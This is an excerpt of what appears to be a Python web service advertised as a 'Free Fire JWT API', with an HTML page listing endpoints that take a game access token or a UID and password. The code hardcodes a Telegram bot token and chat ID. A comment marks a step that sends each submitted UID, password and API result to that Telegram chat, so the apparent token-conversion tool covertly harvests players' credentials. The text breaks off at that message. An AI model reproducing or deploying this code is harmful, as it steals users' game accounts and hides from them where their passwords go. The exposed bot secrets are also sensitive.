...
TELEGRAM_BOT_TOKEN = "8327940548:AAEFKUp-3WN_TG8NxQT12Hyeu-q6JZjGH4s"
TELEGRAM_CHAT_ID = "-1003766431134"
...
<head>
    <meta charset="UTF-8">
    <title>Free Fire JWT API</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            background: linear-gradient(135deg, #ffd1dc, #ffe4ec, #fff0f5);
        ...
        .logo img {
            ...
            box-shadow: 0 0 20px rgba(255, 158, 181, 0.6);
            margin-bottom: 20px;
        }
        ...
        .endpoint {
            ...
            font-size: 15px;
            color: #555;
            box-shadow: 0 5px 15px rgba(255, 182, 193, 0.35);
...
<body>
    ...
    <div class="container">
        <div class="logo">
            <img src="https://i.imgur.com/6XGQKQy.png" alt="Logo">
        </div>

        <h1> Free Fire JWT API</h1>
        <p>Access Token & UID / Password  JWT Token</p>
        ...
        <div class="endpoint">
            <span>GET</span> /access-jwt?access_token=YOUR_ACCESS_TOKEN
        </div>

        <div class="endpoint">
            <span>GET</span> /token?uid=YOUR_UID&password=YOUR_PASSWORD
        </div>

        <hr>

        <p><b>c to bi:</b> @Tranducdev</p>
...
def oauth_guest():
    ...
    try:
        oauth_response = requests.post(
            oauth_url, data=payload, headers=headers, timeout=5
        )
    ...
    #  GI LOG TELEGRAM (UID + PASS + API)
    tg_msg = f"""
<b> UID LOGIN SUCCESS</b>
